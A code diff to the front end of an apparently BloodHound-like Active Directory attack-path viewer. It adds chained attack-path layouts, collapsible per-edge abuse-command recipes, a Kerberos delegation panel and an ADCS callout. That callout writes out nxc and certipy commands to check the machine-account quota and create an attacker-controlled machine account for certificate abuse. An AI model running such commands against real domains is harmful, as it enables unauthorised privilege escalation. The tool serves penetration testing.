@@ -61,6 +61,7 @@ let relationMode = "abusable";
 let graph = { nodes: [], edges: [], drawEdges: [], totalNodes: 0, totalEdges: 0 };
 let nodeBySid = new Map();
 let selected = -1;
+let panelSid = "";
 let hover = -1;
 let hoverEdge = -1;
 let scale = 1;
@@ -137,8 +138,48 @@ function renderDomains() {
   }));
 }
 
-function deleteDomain(id, name) {
-  if (!confirm(`Delete "${name}" from the database?\n\nThis removes all its nodes, edges and owned marks. This cannot be undone.`)) return;
+// A native confirm() cannot say what is actually about to be lost, and it stops
+// the page dead. This one names the graph, spells out what goes with it, and can
+// be dismissed the way any dialog should be — Esc, backdrop or Cancel.
+let confirmResolve = null;
+
+function askConfirm({ title, text, detail = "", okLabel = "Delete", danger = true }) {
+  const modal = $("#confirmModal");
+  $("#confirmTitle").textContent = title;
+  $("#confirmText").textContent = text;
+  $("#confirmDetail").innerHTML = detail;
+  $("#confirmDetail").classList.toggle("hidden", !detail);
+  const ok = $("#confirmOk");
+  ok.textContent = okLabel;
+  ok.classList.toggle("danger", danger);
+  modal.classList.remove("hidden");
+  ok.focus();
+  return new Promise((resolve) => { confirmResolve = resolve; });
+}
+
+function closeConfirm(answer) {
+  if (!confirmResolve) return;
+  $("#confirmModal").classList.add("hidden");
+  const resolve = confirmResolve;
+  confirmResolve = null;
+  resolve(answer);
+}
+
+$("#confirmOk").addEventListener("click", () => closeConfirm(true));
+$("#confirmCancel").addEventListener("click", () => closeConfirm(false));
+$$('[data-close="confirm"]').forEach((el) => el.addEventListener("click", () => closeConfirm(false)));
+
+async function deleteDomain(id, name) {
+  const d = domains.find((x) => x.id === id);
+  const counts = d
+    ? `<span><b>${d.node_count}</b> nodes</span><span><b>${d.edge_count}</b> edges</span><span>owned marks</span>`
+    : "";
+  const ok = await askConfirm({
+    title: "Delete this graph?",
+    text: `“${name}” and everything imported with it will be removed from the database. This cannot be undone.`,
+    detail: counts,
+  });
+  if (!ok) return;
   api(`/api/domain/${id}`, { method: "DELETE" })
     .then((r) => {
       toast(`Deleted ${r.deleted || name}`);
@@ -220,7 +261,14 @@ async function loadGraph(query = "") {
   const emptyMsg = view === "paths"
     ? "No attack path found. Mark a starting object as owned, then open Attack paths."
     : "No objects matched this context.";
-  setStatus(graph.nodes.length ? `${graph.nodes.length} nodes · ${graph.drawEdges.length} visual links. Click a node to inspect; use object actions to narrow context.` : emptyMsg);
+  const hops = graph.chained
+    ? Math.max(0, ...graph.nodes.map((n) => (n.depth == null ? 0 : n.depth)))
+    : 0;
+  setStatus(graph.nodes.length
+    ? (graph.chained
+        ? `Chain from the selected object: ${graph.nodes.length} objects across ${hops} hop${hops === 1 ? "" : "s"}. Columns run left → right by distance.`
+        : `${graph.nodes.length} nodes · ${graph.drawEdges.length} visual links. Click a node to inspect; use object actions to narrow context.`)
+    : emptyMsg);
   if (!focusSid) closePanel();
   updateEmptyState();
   requestDraw();
@@ -286,7 +334,8 @@ function hash01(s) {
 
 function layoutGraph() {
   if (focusSid && nodeBySid.has(focusSid)) {
-    layoutFocusedGraph();
+    if (graph.chained) layoutChainGraph();
+    else layoutFocusedGraph();
     return;
   }
   const buckets = { Domain: [], Group: [], User: [], Computer: [], GPO: [], OU: [], Container: [], Base: [] };
@@ -317,6 +366,41 @@ function layoutGraph() {
       n.y = cy + Math.sin(angle) * radius;
     });
   }
+}
+
+// Chain mode lays the graph out as columns, one per hop away from the selected
+// object, so the attack chain reads left-to-right instead of collapsing into a
+// ring. Depth -1 is the inbound context (who got you here).
+function layoutChainGraph() {
+  graph.nodes.forEach((n, i) => {
+    n.i = i;
+    n.r = (n.type === "Domain" ? 25 : n.highValue ? 22 : n.owned ? 21 : 18) + Math.min(n.degree || 0, 40) * .06;
+    n.locked = false;
+  });
+  const cols = new Map();
+  graph.nodes.forEach((n, i) => {
+    const d = (n.depth === null || n.depth === undefined) ? 99 : n.depth;
+    if (!cols.has(d)) cols.set(d, []);
+    cols.get(d).push(i);
+  });
+  const keys = [...cols.keys()].sort((a, b) => a - b);
+  const maxReal = Math.max(0, ...keys.filter((d) => d !== 99));
+  keys.forEach((d) => {
+    const items = cols.get(d);
+    items.sort((a, b) =>
+      (graph.nodes[b].highValue - graph.nodes[a].highValue) ||
+      (graph.nodes[b].owned - graph.nodes[a].owned) ||
+      ((graph.nodes[b].degree || 0) - (graph.nodes[a].degree || 0)));
+    const x = (d === 99 ? maxReal + 1.6 : d) * 360;
+    const gap = Math.max(84, Math.min(132, 1000 / Math.max(1, items.length)));
+    const span = (items.length - 1) / 2;
+    items.forEach((idx, k) => {
+      const n = graph.nodes[idx];
+      n.x = x + (k % 2 ? 46 : 0);
+      n.y = (k - span) * gap;
+      if (n.id === focusSid) { n.x = 0; n.y = 0; n.r = Math.max(n.r, 28); }
+    });
+  });
 }
 
 function layoutFocusedGraph() {
@@ -722,6 +806,7 @@ function pickEdge(px, py) {
 }
 
 function openPanel(idx) {
+  if (graph.nodes[idx] && graph.nodes[idx].id !== panelSid) { openRecipes = new Set(); panelSid = graph.nodes[idx].id; }
   selected = idx;
   requestDraw();
   const n = graph.nodes[idx];
@@ -729,12 +814,49 @@ function openPanel(idx) {
   $("#panelBody").innerHTML = `<div class="empty">Loading node...</div>`;
   api(`/api/domain/${active.id}/node/${encodeURIComponent(n.id)}`).then((detail) => {
     $("#panelBody").innerHTML = renderPanel(detail);
-    $$(".copy").forEach((b) => b.addEventListener("click", () => copyText(b.dataset.cmd)));
+    $$(".copy, .copy-all").forEach((b) => b.addEventListener("click", () => copyText(b.dataset.cmd)));
     $(".owned-toggle")?.addEventListener("click", () => toggleOwned(detail.id));
     $$(".graph-rel").forEach((b) => b.addEventListener("click", () => focusGraph(detail.id, b.dataset.rel)));
     $$(".ptab").forEach((b) => b.addEventListener("click", () => switchPanelTab(b.dataset.tab)));
     $$("#panelBody [data-goto]").forEach((el) => el.addEventListener("click", () => focusGraph(el.dataset.goto, "all")));
+    bindCommandTab(detail);
   }).catch((e) => $("#panelBody").innerHTML = `<div class="empty">${esc(e.message)}</div>`);
+}
+
+// Re-render only the Commands tab, keeping the panel's scroll position and the
+// tab the operator is on — toggling a filter should not throw them back to the top.
+function bindCommandTab(detail) {
+  const rerender = () => {
+    const body = $("#panelBody");
+    const y = body.scrollTop;
+    const activeTab = $(".ptab.active")?.dataset.tab || "summary";
+    body.innerHTML = renderPanel(detail);
+    switchPanelTab(activeTab);
+    body.scrollTop = y;
+    $$(".copy, .copy-all").forEach((b) => b.addEventListener("click", () => copyText(b.dataset.cmd)));
+    $(".owned-toggle")?.addEventListener("click", () => toggleOwned(detail.id));
+    $$(".graph-rel").forEach((b) => b.addEventListener("click", () => focusGraph(detail.id, b.dataset.rel)));
+    $$(".ptab").forEach((b) => b.addEventListener("click", () => switchPanelTab(b.dataset.tab)));
+    $$("#panelBody [data-goto]").forEach((el) => el.addEventListener("click", () => focusGraph(el.dataset.goto, "all")));
+    bindCommandTab(detail);
+  };
+  $$(".copy-all").forEach((b) => b.addEventListener("click", () => copyText(b.dataset.cmd)));
+  $$("#panelBody [data-toggle]").forEach((b) => b.addEventListener("click", () => {
+    // Derive from the DOM, not from the set: the first recipe renders open
+    // without being in the set, so a blind toggle would desync the two.
+    const k = b.dataset.toggle;
+    const card = b.closest(".recipe");
+    const nowOpen = !card.classList.contains("open");
+    card.classList.toggle("open", nowOpen);
+    if (nowOpen) openRecipes.add(k); else openRecipes.delete(k);
+    b.setAttribute("aria-expanded", nowOpen);
+  }));
+  $$("#panelBody [data-os]").forEach((b) => b.addEventListener("click", () => { cmdOs = b.dataset.os; rerender(); }));
+  $$("#panelBody [data-expand]").forEach((b) => b.addEventListener("click", () => {
+    if (b.dataset.expand === "none") openRecipes.clear();
+    else $$("#panelBody [data-recipe]").forEach((c) => openRecipes.add(c.dataset.recipe));
+    rerender();
+  }));
 }
 
 function switchPanelTab(tab) {
@@ -762,22 +884,6 @@ function escBadge(e) {
 
 function renderGroupCompact(e) {
   return `<div class="edge-row hot delegated"><div><b>${esc(e.right)}</b>${escBadge(e)} → ${esc(e.targetLabel)}</div><small>${esc(e.targetType || "")}</small>${renderViaTrail(e.via)}</div>`;
-}
-
-function renderGroupAbuse(e) {
-  return `
-    <div class="edge-row delegated">
-      <div><b>${esc(e.right)}</b>${escBadge(e)} → ${esc(e.targetLabel)}</div>
-      <small>${esc(e.targetType)}</small>
-      ${renderViaTrail(e.via)}
-      ${(e.abuse || []).map((a) => `
-        <div class="cmd">
-          <div class="cmd__head"><span><i class="os-badge ${esc(a.os)}">${esc(a.os)}</i> · ${esc(a.tool)}</span><button class="copy" data-cmd="${esc(a.cmd)}">copy</button></div>
-          <pre>${colorCommand(a.cmd)}</pre>
-        </div>
-      `).join("")}
-    </div>
-  `;
 }
 
 // Groups whose membership is itself a capability worth calling out — access or
@@ -812,6 +918,48 @@ function renderMemberOf(out) {
   return `<div class="section-title">Member of <span class="count">${groups.length}</span></div><div class="memberof">${rows}</div>`;
 }
 
+// The delegation card. BloodHound tells you an AllowedToDelegate edge exists;
+// what you need before touching a keyboard is WHICH SPN it covers, whether
+// protocol transition is on (it decides if a plain getST can ever work), and who
+// may already act on this object's behalf.
+function renderDelegation(d) {
+  if (!d) return "";
+  const tone = d.unconstrained ? "unconstrained"
+    : d.protocolTransition ? "kcd"
+    : (d.allowedToDelegate || []).length ? "kcd-npt" : "rbcd";
+  const targets = (d.allowedToDelegate || []).map((t) => `
+    <div class="dg-row"${t.target ? ` data-goto="${esc(t.target)}"` : ""}>
+      <span class="dg-svc">${esc(t.service || "spn")}</span>
+      <span class="dg-spn">${esc(t.spn || "—")}</span>
+      <span class="dg-arrow">→</span>
+      <b>${esc(t.targetLabel || "?")}</b>
+      <small>${esc(t.targetType || "")}</small>
+    </div>`).join("");
+  const actors = (d.allowedToActOnBehalf || []).map((a) => `
+    <div class="dg-row" data-goto="${esc(a.sid)}">
+      <span class="dg-svc rbcd">rbcd</span>
+      <b>${esc(a.label)}</b>
+      <small>${esc(a.type || "")}</small>
+      <span class="dg-arrow">can impersonate anyone here</span>
+    </div>`).join("");
+  const own = (d.ownSpns || []).map((x) => `<code>${esc(x)}</code>`).join(" ");
+  return `
+    <div class="section-title">⇄ Kerberos delegation</div>
+    <div class="delegation ${tone}">
+      <div class="dg-kind">${esc(d.kind)}</div>
+      <p class="dg-note">${esc(d.note)}</p>
+      ${targets ? `<div class="dg-label">Can delegate to</div>${targets}` : ""}
+      ${actors ? `<div class="dg-label">Can act on its behalf</div>${actors}` : ""}
+      ${own ? `<div class="dg-label">Its own SPNs <em>— the evidence ticket is minted against one of these</em></div><div class="dg-spns">${own}</div>` : ""}
+      ${d.helper && !d.protocolTransition && !d.unconstrained
+        ? `<div class="dg-hint"><b>Bridge account:</b> <span data-goto="${esc(d.helper.sid)}">${esc(d.helper.name)}</span> — holds an SPN (<code>${esc(d.helper.spn)}</code>), which is what RBCD requires of the principal you delegate from.${d.helper.owned ? " Already marked owned." : ""}</div>`
+        : ""}
+      ${d.adminSensitive
+        ? `<div class="dg-warn">Administrator is flagged <b>sensitive / NOT_DELEGATED</b> — the KDC will not delegate it. The commands impersonate the target's machine account instead.</div>`
+        : ""}
+    </div>`;
+}
+
 function renderPanel(n) {
   const out = n.outgoing || [];
   const inc = n.incoming || [];
@@ -835,6 +983,7 @@ function renderPanel(n) {
         <button class="graph-rel ${focusSid === n.id && relationMode === "outbound" ? "active" : ""}" data-rel="outbound"><b>Outbound</b><span>what this controls</span></button>
         <button class="graph-rel ${focusSid === n.id && relationMode === "inbound" ? "active" : ""}" data-rel="inbound"><b>Inbound</b><span>who controls this</span></button>
         <button class="graph-rel ${focusSid === n.id && relationMode === "all" ? "active" : ""}" data-rel="all"><b>All links</b><span>full local context</span></button>
+        <button class="graph-rel chain ${focusSid === n.id && relationMode === "chain" ? "active" : ""}" data-rel="chain"><b>↯ Follow the chain</b><span>every hop this object leads to, laid out by distance</span></button>
       </div>
     </div>
     <div class="panel-tabs">
@@ -851,6 +1000,7 @@ function renderPanel(n) {
         <div><b>${abuseIn.length}</b><span>Can be abused</span></div>
         ${gd.length ? `<div class="via-metric"><b>${gd.length}</b><span>Via groups</span></div>` : ""}
       </div>
+      ${renderDelegation(n.delegation)}
       ${renderMemberOf(out)}
       <div class="section-title">Top properties</div>
       <div class="props">
@@ -867,9 +1017,13 @@ function renderPanel(n) {
       ${out.filter((e) => !e.abusable).slice(0, 45).map(renderCompactEdge).join("") || `<div class="empty">No other outbound connections.</div>`}
     </section>
     <section class="tabpage" data-page="commands">
-      <div class="section-title">Commands — directly held rights</div>
-      ${abuseOut.slice(0, 30).map(renderAbuseEdge).join("") || `<div class="empty">No commands available for this object.</div>`}
-      ${gd.length ? `<div class="section-title">Commands — via groups &amp; OU control</div>${gd.slice(0, 30).map(renderGroupAbuse).join("")}` : ""}
+      ${renderCmdToolbar(abuseOut.length + gd.length)}
+      <div class="section-title">Directly held <span class="count">${abuseOut.length}</span></div>
+      ${abuseOut.slice(0, 30).map((e, i) => renderRecipe(e, { forceOpen: i === 0 && !openRecipes.size })).join("")
+        || `<div class="empty">Nothing this object can abuse on its own.</div>`}
+      ${gd.length ? `<div class="section-title">Through groups &amp; OU control <span class="count">${gd.length}</span></div>
+        <p class="section-hint">Rights this object does not hold directly. Each recipe starts with the steps that make the right yours.</p>
+        ${gd.slice(0, 30).map((e) => renderRecipe(e, { via: e.via, viaTag: "gd" })).join("")}` : ""}
     </section>
     <section class="tabpage" data-page="raw">
       <div class="section-title">All imported properties</div>
@@ -887,17 +1041,72 @@ function renderCompactEdge(e, reverse = false) {
   return `<div class="edge-row ${e.abusable ? "hot" : ""}"><div><b>${esc(e.right)}</b>${escBadge(e)} ${arrow} ${esc(name)}</div><small>${esc(type || "")}</small></div>`;
 }
 
+// A multi-step chain arrives as "4 · evidence ticket via RBCD"; pull the leading
+// number out into a chip so a chain reads as an ordered recipe, not a flat list.
+function renderCmd(a) {
+  const m = /^(\d+)\s+·\s+([\s\S]+)$/.exec(a.tool || "");
+  const stepChip = m ? `<i class="step">${esc(m[1])}</i>` : "";
+  const name = m ? m[2] : (a.tool || "");
+  return `
+    <div class="cmd${m ? " stepped" : ""}">
+      <div class="cmd__head"><span>${stepChip}<i class="os-badge ${esc(a.os)}">${esc(a.os)}</i> · ${esc(name)}</span><button class="copy" data-cmd="${esc(a.cmd)}">copy</button></div>
+      <pre>${colorCommand(a.cmd)}</pre>
+    </div>`;
+}
+
+// One abusable edge = one collapsible recipe. A delegation chain is now ten-plus
+// commands, so dropping them all open at once buries the graph the operator came
+// for. Header first (what it gets you, how many steps), body on demand.
+let cmdOs = "all";          // all | linux | windows
+let openRecipes = new Set(); // recipe keys the operator expanded, kept across re-renders
+
+function recipeKey(e, viaTag) {
+  return `${viaTag || ""}|${e.right}|${e.target || e.targetLabel}`;
+}
+
+function renderRecipe(e, opts = {}) {
+  const cmds = (e.abuse || []).filter((a) => cmdOs === "all" || a.os === cmdOs);
+  if (!cmds.length) return "";
+  const key = recipeKey(e, opts.viaTag);
+  const open = openRecipes.has(key) || !!opts.forceOpen;
+  const sev = edgeSeverity(e);
+  const steps = cmds.filter((a) => /^\d+\s+·/.test(a.tool || "")).length;
+  const all = cmds.map((a) => a.cmd).join("\n");
+  return `
+    <div class="recipe${open ? " open" : ""}" data-recipe="${esc(key)}" style="--sev:${SEVERITY[sev]}">
+      <button class="recipe__head" data-toggle="${esc(key)}" aria-expanded="${open}">
+        <span class="recipe__chev" aria-hidden="true">▸</span>
+        <span class="recipe__right">${esc(e.right)}</span>${escBadge(e)}
+        <span class="recipe__arrow">→</span>
+        <span class="recipe__target">${esc(short(e.targetLabel, 30))}</span>
+        <span class="recipe__meta">${esc(e.targetType || "")}${steps ? ` · ${steps} steps` : ` · ${cmds.length} cmd`}</span>
+      </button>
+      ${opts.via ? renderViaTrail(opts.via) : ""}
+      ${e.note ? `<div class="recipe__note">${esc(e.note)}</div>` : ""}
+      <div class="recipe__body">
+        ${steps > 1 ? `<button class="copy-all" data-cmd="${esc(all)}">⧉ copy all ${cmds.length} commands</button>` : ""}
+        ${cmds.map(renderCmd).join("")}
+      </div>
+    </div>`;
+}
+
+function renderCmdToolbar(total) {
+  const btn = (id, label) => `<button class="osfilter ${cmdOs === id ? "active" : ""}" data-os="${id}">${label}</button>`;
+  return `
+    <div class="cmd-toolbar">
+      <div class="osfilters">${btn("all", "All")}${btn("linux", "Linux")}${btn("windows", "Windows")}</div>
+      <span class="cmd-toolbar__count">${total} abuse${total === 1 ? "" : "s"}</span>
+      <button class="osfilter" data-expand="all">expand all</button>
+      <button class="osfilter" data-expand="none">collapse</button>
+    </div>`;
+}
+
 function renderAbuseEdge(e) {
   return `
     <div class="edge-row">
       <div><b>${esc(e.right)}</b>${escBadge(e)} → ${esc(e.targetLabel)}</div>
       <small>${esc(e.targetType)}</small>
-      ${(e.abuse || []).map((a) => `
-        <div class="cmd">
-          <div class="cmd__head"><span><i class="os-badge ${esc(a.os)}">${esc(a.os)}</i> · ${esc(a.tool)}</span><button class="copy" data-cmd="${esc(a.cmd)}">copy</button></div>
-          <pre>${colorCommand(a.cmd)}</pre>
-        </div>
-      `).join("")}
+      ${(e.abuse || []).map(renderCmd).join("")}
     </div>
   `;
 }
@@ -1180,7 +1389,20 @@ function escCtx(ctx) {
   if (tpl.length) parts.push(`<span class="esc-ctx__k">template</span> ${tpl.map(esc).join(", ")}`);
   if (cas.length) parts.push(`<span class="esc-ctx__k">CA</span> ${cas.map(esc).join(", ")}`);
   if (prin.length) parts.push(`<span class="esc-ctx__k">vulnerable</span> ${prin.map(esc).join(", ")}`);
-  return `<div class="esc-ctx">${parts.join('<span class="esc-ctx__sep">·</span>') || "flagged in this environment"}</div>`;
+  const head = `<div class="esc-ctx">${parts.join('<span class="esc-ctx__sep">·</span>') || "flagged in this environment"}</div>`;
+  if (!ctx.viaMachineAccount) return head;
+  // Domain Computers holding Enroll is reachable without owning a computer: make
+  // one. Worth its own callout, because the enroll list alone reads as a dead end.
+  return head + `
+    <div class="esc-maq">
+      <b>Reachable via a new machine account</b>
+      <span>${[...(ctx.notes || [])].map(esc).join(" ") || "Domain Computers can enroll — create a machine account and enroll as it."}</span>
+      <div class="esc-maq__cmds">
+        <div class="cmd"><div class="cmd__head"><span><i class="os-badge linux">linux</i> · check the quota</span><button class="copy" data-cmd="nxc ldap &lt;dc-ip&gt; -u '&lt;user&gt;' -p '&lt;pass&gt;' -M maq">copy</button></div><pre>${colorCommand("nxc ldap <dc-ip> -u '<user>' -p '<pass>' -M maq")}</pre></div>
+        <div class="cmd"><div class="cmd__head"><span><i class="os-badge linux">linux</i> · create the account</span><button class="copy" data-cmd="certipy account create -u '&lt;user&gt;@&lt;domain&gt;' -p '&lt;pass&gt;' -dc-ip &lt;dc-ip&gt; -user 'OWNED$' -pass 'MachinePassword123!'">copy</button></div><pre>${colorCommand("certipy account create -u '<user>@<domain>' -p '<pass>' -dc-ip <dc-ip> -user 'OWNED$' -pass 'MachinePassword123!'")}</pre></div>
+      </div>
+      <small>Then run the chain below as <code>OWNED$</code>. Requires ms-DS-MachineAccountQuota &gt; 0, or an explicit right to create computer objects.</small>
+    </div>`;
 }
 
 function renderAdcs(filter = "") {
@@ -1250,10 +1472,12 @@ $("#adcsJson").addEventListener("change", (ev) => {
           const id = (fx.esc || "").toUpperCase();
           if (!id) continue;
           let c = adcsFound.get(id);
-          if (!c) { c = { templates: new Set(), cas: new Set(), principals: new Set() }; adcsFound.set(id, c); }
+          if (!c) { c = { templates: new Set(), cas: new Set(), principals: new Set(), notes: new Set() }; adcsFound.set(id, c); }
           if (fx.template) c.templates.add(fx.template);
           if (fx.ca) c.cas.add(fx.ca);
           (fx.principals || []).forEach((p) => p && c.principals.add(p));
+          if (fx.note) c.notes.add(fx.note);
+          if (fx.viaMachineAccount) c.viaMachineAccount = true;
         }
         toast(`ADCS: ${adcsFound.size} ESC found · ${r.templates} template(s) · ${r.edges} edge(s)`);
       }
@@ -1265,7 +1489,11 @@ $("#adcsJson").addEventListener("change", (ev) => {
     })
     .catch((e) => toast(`certipy import failed: ${e.message}`));
 });
-addEventListener("keydown", (ev) => { if (ev.key === "Escape") closeAdcs(); });
+addEventListener("keydown", (ev) => {
+  if (ev.key !== "Escape") return;
+  if (confirmResolve) { closeConfirm(false); return; }
+  closeAdcs();
+});
 
 $("#refreshDomains").addEventListener("click", loadDomains);
 $("#backBtn").addEventListener("click", () => {
